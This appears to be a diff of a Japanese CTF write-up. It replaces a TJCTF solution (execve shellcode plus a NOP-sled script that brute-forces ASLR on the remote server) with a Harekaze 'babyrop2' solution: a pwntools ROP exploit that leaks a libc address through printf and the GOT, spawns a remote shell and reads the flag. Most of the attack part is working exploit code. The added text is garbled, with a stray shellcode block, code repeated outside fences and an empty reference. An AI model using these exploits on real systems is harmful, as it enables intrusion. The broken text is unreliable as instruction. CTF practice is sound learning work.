@@ -83,355 +83,233 @@ saru@lucifen:~/wani-writeup/2019/05-harekaze/pwn-baby-rop-2$
 
 EIP取れたけれどNXがenableなのでROPを組むことを考える。
 戦略はlibcがついてるのでのlibc内のexecve関数と文字列`/bin/sh`を使ってシェルを起動するという手順。
-ASLRあるんだろうなーと思いつつ、手元でまずは動作確認。
-gdb内でシェルが起動することは確認。
+1.  pop rdi ; ret: execveに渡す第1引数。/bin/shのアドレス。
+2.  pop rsi ; pop r15 ; ret: execveに渡す第2引数。NULLで良い。
+3.  libc上のexecveアドレスに飛ばす
 
+でやってみる。
+まぁASLRあるんだろうなーと思いつつ、gdb上でASLRを無効にした状態ではシェルが起動することは確認。
+```
+import sys
+import pwn
+
+addr_libc_start_main = 0x0000000000021ab0
+addr_libc_execve = 0x00000000000e4e30
+addr_libc_binsh = 0x1b3e9a
+addr_start_main = 0x7ffff7a05ab0
+
+addr_offset = addr_start_main - addr_libc_start_main
+addr_execve = addr_offset + addr_libc_execve
+addr_binsh = addr_offset + addr_libc_binsh
+
+rop_pop_rdi = 0x0000000000400733
+rop_pop_rsi = 0x0000000000400731
+
+s = b"A" * 40
+#s += pwn.p64(0x40063a)
+s += pwn.p64(rop_pop_rdi)
+s += pwn.p64(addr_binsh)
+s += pwn.p64(rop_pop_rsi)
+s += pwn.p64(0x0)
+s += pwn.p64(0x0)
+s += pwn.p64(addr_execve)
+
+sys.stdout.buffer.write(s)
 ```python
+
 b"\x68\x2f\x6c\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
 ```
 
-```python: make_string002.py
+### アドレスのリーク
+
+で、これをremoteに送り込むコードを書いたがやはり動かない。
+ASLRが有効なんだろう。
+最近はもはやASLRが無効の問題なんて出ないんだろうか。
+
+以前putsを使ったアドレスリークはしたことがあったのだが、今回はputsが無いようす。
+どうするか...
+といろいろぐぐったり考えたりしてたらprintfで%sの時にGOTアドレス入れれば行けるんじゃね？
+と思いつく。
+
+戦略は
+1. ROPで「printf("Welcome to the Pwn World again, %s!", printfのGOTアドレス);」を実行してprintfのロードアドレスを%sから吐かせる
+2. 吐かせたprintfのロードアドレスからlibcがロードされてるアドレスを特定
+3. libcがロードされているアドレスを基準にexecveと/bin/shのロードアドレスを求めてROPでシェルを起動
+
+と立てた。
+
+と、このように、うっかりprintfのGOT (Global Offset Table)アドレスを追ってしまったのがまずかった...
+printfを呼び出すためにprintfのPLT (Procedure Linkage Table)は確認でいていたのでprintfのlibc上のアドレスを追ってしまった。
+これが間違いのもとで、objdump -d ./babyrop2するとどれがprintfに一致するのか分からない関数がたくさん出て来た。
+これで時間を消費してしまってタイムアップ。
+
+```bash-statement
+$ objdump -d libc.so.6 | grep printf | egrep "^0"
+000000000004d170 <_IO_vfprintf@@GLIBC_2.2.5>:
+0000000000050060 <vprintf@@GLIBC_2.2.5>:
+0000000000052bc0 <__printf_fp@@GLIBC_2.2.5>:
+0000000000052be0 <register_printf_specifier@@GLIBC_2.10>:
+0000000000052cf0 <register_printf_function@@GLIBC_2.2.5>:
+0000000000052d00 <parse_printf_format@@GLIBC_2.2.5>:
+0000000000054a50 <register_printf_modifier@@GLIBC_2.10>:
+0000000000054db0 <register_printf_type@@GLIBC_2.10>:
+0000000000054ea0 <printf_size@@GLIBC_2.2.5>:
+0000000000055750 <printf_size_info@@GLIBC_2.2.5>:
+0000000000055770 <fprintf@@GLIBC_2.2.5>:
+0000000000055800 <_IO_printf@@GLIBC_2.2.5>:
+00000000000558b0 <snprintf@@GLIBC_2.2.5>:
+0000000000055940 <_IO_sprintf@@GLIBC_2.2.5>:
+00000000000559d0 <__asprintf@@GLIBC_2.2.5>:
+0000000000055a60 <dprintf@@GLIBC_2.2.5>:
+0000000000058940 <vfwprintf@@GLIBC_2.2.5>:
+0000000000070160 <_IO_vsprintf@@GLIBC_2.2.5>:
+0000000000071420 <fwprintf@@GLIBC_2.2.5>:
+00000000000714b0 <swprintf@@GLIBC_2.2.5>:
+0000000000071540 <vwprintf@@GLIBC_2.2.5>:
+0000000000071560 <wprintf@@GLIBC_2.2.5>:
+00000000000717e0 <vswprintf@@GLIBC_2.2.5>:
+00000000000766d0 <vasprintf@@GLIBC_2.2.5>:
+0000000000076830 <vdprintf@@GLIBC_2.2.5>:
+00000000000769d0 <__vsnprintf@@GLIBC_2.2.5>:
+0000000000076bd0 <obstack_vprintf@@GLIBC_2.2.5>:
+0000000000076d50 <obstack_printf@@GLIBC_2.2.5>:
+```
+
+Harekaze CTFが終わってから、あ、start_mainのGOTアドエスが安定じゃん、と思いついて解いたらあっさりflagゲット。
+やってしまった...
+
+### 最終プログラム
+
+```
 import sys
+import pwn
 
-shellcode_ls = b"\x68\x2f\x6c\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
+io = pwn.remote('problem.harekaze.com', 20005)
 
-sys.stdout.buffer.write(b"A" * 20 + shellcode_ls + b"B" * 35 + b"\x30\xd4\xff\xff\n")
+addr_libc_start_main = 0x0000000000020740
+addr_libc_execve = 0x00000000000cc770
+addr_libc_binsh = 0x18cd57
 
+addr_start_main = 0x7ffff7a05ab0
+addr_start_main_got = 0x601028
+addr_main = 0x400540
 
+addr_printf_plt = 0x00000000004004f0
+addr_welcome = 0x400770
+
+rop_pop_rdi = 0x0000000000400733
+rop_pop_rsi = 0x0000000000400731
+
+s = b"A" * 40
+s += pwn.p64(rop_pop_rdi)
+s += pwn.p64(addr_welcome)
+s += pwn.p64(rop_pop_rsi)
+s += pwn.p64(addr_start_main_got)
+s += pwn.p64(0x0)
+s += pwn.p64(addr_printf_plt)
+s += pwn.p64(addr_main)
+
+io.sendline(s)
+buf = io.recvline()
+print(buf)
+buf = io.recvline()
+print(buf)
+
+addr_start_main= buf[32:38] + b"\x00\x00"
+addr_start_main = pwn.u64(addr_start_main)
+addr_offset = addr_start_main - addr_libc_start_main
+addr_execve = addr_offset + addr_libc_execve
+addr_binsh = addr_offset + addr_libc_binsh
+
+s = b"A" * 40
+s += pwn.p64(rop_pop_rdi)
+s += pwn.p64(addr_binsh)
+s += pwn.p64(rop_pop_rsi)
+s += pwn.p64(0x0)
+s += pwn.p64(0x0)
+s += pwn.p64(addr_execve)
+
+io.sendline(s)
+buf = io.recvline()
+print(buf)
+io.interactive()
 ```
+
+### 実行結果
 
 ```bash-statement
-$ python make_string002.py > exploit002.txt
-```
-
-```bash-statement
-gef➤ run < exploit002.txt
-Starting program: /home/saru/wani-writeup/2019/04-tjctf/bin-silly-sledshop/sledshop < exploit002.txt
-The following products are available:
-|  Saucer  | $1 |
-| Kicksled | $2 |
-| Airboard | $3 |
-| Toboggan | $4 |
-Which product would you like?
-Sorry, we are closed.
-process 29638 is executing new program: /bin/ls
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-a.out
-attack.sh
-exploit001.txt
-[Inferior 1 (process 29638) exited normally]
-gef➤  
-```
-
-### ASLRとの戦い
-
-まずは動いたコードを使ってexploit「`solve001.py`」を書いてみたけどまぁこれは予想通りシェルは取れない。
-gdb上での実行と実際の実行では環境変数などへの影響でスタックに積まれているデータが変わってアドレスも変わってしまうことを知っていたのでこれはまぁそうかなと納得。
-
-```python:solve001.py
-import socket
-import telnetlib
-import sys
-import struct
-
-def read_until(sock, s):
-    line = b""
-    while line.find(s) < 0:
-        line += sock.recv(1)
-    return line
-
-
-host = "p1.tjctf.org"
-port = 8010
-
-target_addr = int(0xffffd430)
-print("%x" % (target_addr))
-target_addr = struct.pack("<L", target_addr)
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-print(host)
-print(port)
-sock.connect((host, port))
-
-ret = read_until(sock, b"Which product would you like?\n")
-print(ret)
-
-shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
-
-sock.sendall(b"A" * 20 + shellcode_sh + b"B" * 35 + b"\x30\xd4\xff\xff\n")
-
-t = telnetlib.Telnet()
-t.sock = sock
-t.interact()
-```
-
-```bash-statement
-$ python solve001.py
-ffffd430
-p1.tjctf.org
-8010
-b'The following products are available:\n|  Saucer  | $1 |\n| Kicksled | $2 |\n| Airboard | $3 |\n| Toboggan | $4 |\nWhich product would you like?\n'
-Sorry, we are closed.
-timeout: the monitored command dumped core
-*** Connection closed by remote host ***
+$ python exploit_05.py
+[+] Opening connection to problem.harekaze.com on port 20005: Done
+b"What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAa!\n"
+b"Welcome to the Pwn World again, @\xa7'\xa9\xd1\x7f!\n"
+b"What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAY!\n"
+[*] Switching to interactive mode
+$ cat /home/babyrop2/flag
+HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
 $
 ```
 
+addr_libc_start_main = 0x0000000000020740
+addr_libc_execve = 0x00000000000cc770
+addr_libc_binsh = 0x18cd57
 
-公開されているソースコードでアドレスの位置を出力するコードを追加してコンパイル。
-ローカルで実行すると`product_name`の先頭は`0xffffd48c`であることが分かる。
+addr_start_main = 0x7ffff7a05ab0
+addr_start_main_got = 0x601028
+addr_main = 0x400540
 
-```
-void shop_order() {
-    int canary = 0;
-    char product_name[64];
-    printf("%p\n", product_name);
+addr_printf_plt = 0x00000000004004f0
+addr_welcome = 0x400770
 
-    printf("Which product would you like?\n");
-    gets(product_name);
+rop_pop_rdi = 0x0000000000400733
+rop_pop_rsi = 0x0000000000400731
 
-    if (canary)
-        printf("Sorry, we are closed.\n");
-    else
-        printf("Sorry, we don't currently have the product %s in stock. Try again later!\n", product_name);
-}
-```
+s = b"A" * 40
+s += pwn.p64(rop_pop_rdi)
+s += pwn.p64(addr_welcome)
+s += pwn.p64(rop_pop_rsi)
+s += pwn.p64(addr_start_main_got)
+s += pwn.p64(0x0)
+s += pwn.p64(addr_printf_plt)
+s += pwn.p64(addr_main)
 
-```
-$ gcc -m32 -z execstack -no-pie -fno-stack-protector sledshop.c -o test_sledshop
- ```
+io.sendline(s)
+buf = io.recvline()
+print(buf)
+buf = io.recvline()
+print(buf)
 
-```
-$ ./test_sledshop
-The following products are available:
-|  Saucer  | $1 |
-| Kicksled | $2 |
-| Airboard | $3 |
-| Toboggan | $4 |
-0xffffd48c
-Which product would you like?
-^C
-$
-```
+addr_start_main= buf[32:38] + b"\x00\x00"
+addr_start_main = pwn.u64(addr_start_main)
+addr_offset = addr_start_main - addr_libc_start_main
+addr_execve = addr_offset + addr_libc_execve
+addr_binsh = addr_offset + addr_libc_binsh
 
-socatでサーバ化して繋ぐと`0xffffd3fc`となる。
-シェルコードの位置はここから+20なのでシェルコードの位置は`0xffffd410`となる。
 
-```bash-statement
-socat tcp-listen:10000,reuseaddr,fork system:'./test_sledshop'
-```
+### addr_libc_start_main、addr_libc_execve、
+start_main関数とexecveのlibc上でのアドレス。
+調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
 ```bash-statement
-$ nc localhost 10000
-The following products are available:
-|  Saucer  | $1 |
-| Kicksled | $2 |
-| Airboard | $3 |
-| Toboggan | $4 |
-0xffffd3fc
-Which product would you like?
-^C
-$
+$ objdump -d libc.so.6 | grep start_main
+0000000000020740 <__libc_start_main@@GLIBC_2.2.5>:
+$ objdump -d libc.so.6 | grep execve
+00000000000cc770 <execve@@GLIBC_2.2.5>:
 ```
 
-とりあえずsocatで立てたローカルサーバでシェルを取れるようにsolve002.pyを書いてみた。
-ローカルだとシェルの起動成功！
-
-```python:solve002.py
-import socket
-import telnetlib
-import sys
-import struct
-
-def read_until(sock, s):
-    line = b""
-    while line.find(s) < 0:
-        line += sock.recv(1)
-    return line
-
-
-host = "localhost"
-port = 10000
-
-target_addr = int(0xffffd410)
-print("%x" % (target_addr))
-target_addr = struct.pack("<L", target_addr)
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-print(host)
-print(port)
-sock.connect((host, port))
-
-ret = read_until(sock, b"Which product would you like?\n")
-print(ret)
-
-shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
-
-sock.sendall(b"A" * 20 + shellcode_sh + b"B" * 35 + target_addr)
-
-t = telnetlib.Telnet()
-t.sock = sock
-t.interact()
+```plain
+addr_libc_start_main = 0x0000000000020740
+addr_libc_execve = 0x00000000000cc770
 ```
 
+### addr_libc_binsh
 
-```bash-statement
-$ python solve002.py
-ffffd410
-localhost
-10000
-b'The following products are available:\n|  Saucer  | $1 |\n| Kicksled | $2 |\n| Airboard | $3 |\n| Toboggan | $4 |\n0xffffd3fc\nWhich product would you like?\n'
-ls
-Sorry, we are closed.
-ls
-attack.sh
-attack_local.sh
-exploit001.txt
-id
-uid=1002(saru) gid=1002(saru) groups=1002(saru),27(sudo),33(www-data)
-exit
-*** Connection closed by remote host ***
 
+```plain
+addr_libc_binsh = 0x18cd57
 ```
-
-そしてこれをそのままリモートに。
-動かない．．．
-考えられる理由は1つしかない。
-ASLRが有効．．．
-高校生の大会じゃないのかよ．．．
-難しすぎだろ．．．
-
-NOP sledを使ったbruteforceをやるしかない。
-記事では知っていたけど、まだ実装はしたことない。
-
-まずはASLRを有効にしてスタックのアドレスの範囲の当たりを付ける。
-先ほど作った`./test_sledshop`を何度か実行してアドレスを吐かせる。
-どうやら`0xff800000`～`0xffffffff`の中のようだ。
-
-
-
-```
-$ sudo sysctl -w kernel.randomize_va_space=2
-kernel.randomize_va_space = 2
-$
-```
-
-ん．．．ということは8388607の範囲。
-広すぎるだろ．．．
-1000 sledさせても8000回...
-
-いや、きっと10000 sledぐらい行けるに違いない。
-
-と思ったのだけどgetsがsegmentation fault起こすので最大でも1000ぐらいしか行けない。
-
-時間かけるかと考え直して1000スレッドさせるsolve003.pyと1000ずつincrementするattack.shを書いた。
-
-```python:solve003.py
-import socket
-import telnetlib
-import sys
-import struct
-
-def read_until(sock, s):
-    line = b""
-    while line.find(s) < 0:
-        line += sock.recv(1)
-
-
-host = "p1.tjctf.org"
-port = 8010
-
-target_addr = int(sys.argv[1])
-print("%x" % (target_addr))
-
-target_addr = struct.pack("<L", target_addr)
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-print(host)
-print(port)
-sock.connect((host, port))
-
-read_until(sock, b"Which product would you like?\n")
-
-shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
-
-sock.sendall(b"A" * 80 + target_addr + b"\x90" * 1000 + shellcode_sh + b"C" * 10 + b"\n")
-
-t = telnetlib.Telnet()
-t.sock = sock
-t.interact()
-```
-
-```bash:attack.sh
-count=4286578688
-while true
-do
-  echo python solve003.py $count
-  python solve003.py $count
-  count=`expr $count + 1000`
-  if [ $count -gt  4294967295 ]; then
-          exit 0
-  fi
-done
-```
-
-```bash-statement
-$ bash attack.sh
-python solve003.py 4286578688
-ff800000
-p1.tjctf.org
-8010
-Sorry, we are closed.
-timeout: the monitored command dumped core
-*** Connection closed by remote host ***
-python solve003.py 4286579688
-ff8003e8
-p1.tjctf.org
-8010
-Sorry, we are closed.
-timeout: the monitored command dumped core
-*** Connection closed by remote host ***
-python solve003.py 4286580688
-ff8007d0
-p1.tjctf.org
-8010
-Sorry, we are closed.
-timeout: the monitored command dumped core
-*** Connection closed by remote host ***
-python solve003.py 4286581688
-ff800bb8
-p1.tjctf.org
-8010
-Sorry, we are closed.
-timeout: the monitored command dumped core
-*** Connection closed by remote host ***
-```
-
-長い．．．
-3時間ぐらいかかってようやくflagゲット。
-バグがあるんじゃないかとドキドキしながらまっていたので心臓に悪い問題だった。
-
-```bash-statement
-python solve003.py 4291613264
-ffccd250
-p1.tjctf.org
-8010
-Sorry, we are closed.
-ls
-flag.txt
-sledshop
-wrapper
-cat flag.txt
-tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}
-```
-
 
 ## 参考
 
-- [ブルートフォースによる32bit ASLR回避 - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/15/073837)
+- 
 
 	
